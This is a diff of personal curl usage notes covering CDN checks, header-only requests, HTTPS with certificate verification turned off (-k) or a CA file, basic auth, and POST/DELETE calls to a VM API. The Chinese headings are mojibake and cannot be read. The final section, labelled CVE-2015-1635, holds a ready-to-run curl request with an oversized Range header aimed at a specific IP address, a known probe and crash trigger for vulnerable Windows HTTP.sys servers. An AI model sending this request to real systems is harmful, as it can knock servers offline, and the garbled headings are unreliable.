@@ -1,36 +1,89 @@
-
-##²é¿´DNS½âÎö³öµÄCDN½ÚµãµÄ×´Ì¬£º
-nslookup my.workec.com |grep Address |grep -v "#53$" |cut -d " " -f2 |xargs -i curl -o /dev/null -v -H "Host:my.workec.com" http://{}/
-
-##²é¿´µÚÒ»Ìõ£º
-nslookup my.workec.com |grep Address |grep -v "#53$" |cut -d " " -f2 |head -n1 |xargs -i curl curl -o /dev/null -v -H "Host:my.workec.com" http://{}/
-
-##½ö»ñÈ¡Í·²¿£º
-nslookup my.workec.com |grep Address |grep -v "#53$" |cut -d " " -f2 |xargs -i curl -I -H "Host:my.workec.com" http://{}/ 
+curlç”¨æ³•è®°å½•
+2016/4/27
 
 
-##×¥°ü²é¿´headÖÐÊÇ·ñÓÐage=1µÄÐÅÏ¢£¬±íÃ÷CDNÊÇ·ñÓÐ»º´æ¡£
+-----------æŸ¥çœ‹DNSè§£æžå‡ºçš„CDNèŠ‚ç‚¹çš„çŠ¶æ€ï¼š
+~]# nslookup www.qq.com |grep Address |grep -v "#53$" |cut -d " " -f2 |xargs -i curl -Iv -H "Host:www.qq.com" http://{}/
 
-curl -vosa http://www.abc.com/setup.exe
+-o è¾“å‡ºé‡å®šå‘
+-v è¯¦ç»†è¾“å‡º
+-H æŒ‡å®š Header
 
-* About to connect() to www.abc.com port 80 (#0)
-*   Trying 1.1.1.1... connected
-* Connected to www.abc.com (1.1.1.1) port 80 (#0)
-> GET /setup.exe HTTP/1.1
-> User-Agent: curl/7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7 NSS/3.14.0.0 zlib/1.2.3 libidn/1.18 libssh2/1.4.2
-> Host: www.abc.com
-> Accept: */*
-> 
-  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
-                                 Dload  Upload   Total   Spent    Left  Speed
-  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0< HTTP/1.1 200 OK
-< Date: Fri, 22 Nov 2013 04:40:41 GMT
-< Server: nginx
-< Content-Type: application/octet-stream
-< Content-Length: 31810120
-< Last-Modified: Fri, 22 Nov 2013 04:16:20 GMT
-< Accept-Ranges: bytes
-< Age: 1
-< X-Via: 1.1 xxx:8080 (Cdn Cache Server V2.0), 1.1 xxx:9123 (Cdn Cache Server V2.0)
-< Connection: keep-alive
+-----------ä»…èŽ·å–å¤´éƒ¨ï¼š
+~]# curl -I http://qq.com/ 
+HTTP/1.1 302 Moved Temporarily
+Server: squid/3.4.3
+Date: Wed, 27 Apr 2016 06:21:53 GMT
+Content-Type: text/html
+Connection: keep-alive
+Location: http://www.qq.com/
+Expires: Wed, 27 Apr 2016 06:22:53 GMT
+Cache-Control: max-age=60
+Vary: Accept-Encoding
+X-Cache: EXPIRED from shanghai.qq.com
+
+
+-----------è¿žæŽ¥https
+~]# curl -I https://120.25.161.130/
+curl: (60) Peer certificate cannot be authenticated with known CA certificates
+More details here: http://curl.haxx.se/docs/sslcerts.html
+
+curl performs SSL certificate verification by default, using a "bundle"
+ of Certificate Authority (CA) public keys (CA certs). If the default
+ bundle file isn't adequate, you can specify an alternate file
+ using the --cacert option.
+If this HTTPS server uses a certificate signed by a CA represented in
+ the bundle, the certificate verification probably failed due to a
+ problem with the certificate (it might be expired, or the name might
+ not match the domain name in the URL).
+If you'd like to turn off curl's verification of the certificate, use
+ the -k (or --insecure) option.
+
+
+æ— è¯ä¹¦æ—¶ï¼š
+~]# curl -k https://www.abc.com/aaa
+æœ‰è¯ä¹¦æ—¶ï¼š
+~]# curl -s --cacert ca.crt https://www.abc.com/aaa
+
+
+-----------ä½¿ç”¨è®¤è¯
+~]# curl -u "username:password" http://www.abc.com/
+
+
+-----------POST data
+~]# curl -s --cacert ca.crt \
+-H "Content-Type: application/xml" \
+-u "user:pass" \
+-d "
+<action>
+  <vm>
+    <status>start</status>
+  </vm>
+</action>
+" \
+"http://www.abc.com//vms/uuid/start" -o ${f_xml}
+
+
+-----------DELETE
+~]# curl -s --cacert ca.crt \
+-H "Content-Type: application/xml" \
+-u "user:pass" \
+-X DELETE \
+"http://www.abc.com//vms/uuid/start" -o ${f_xml}
+
+
+-----------CVE-2015-1635
+~]# curl -v -H "Range: bytes=0-18446744073709551615" http://120.25.161.130/
+
+
+
+
+
+
+
+
+
+
+
+
 
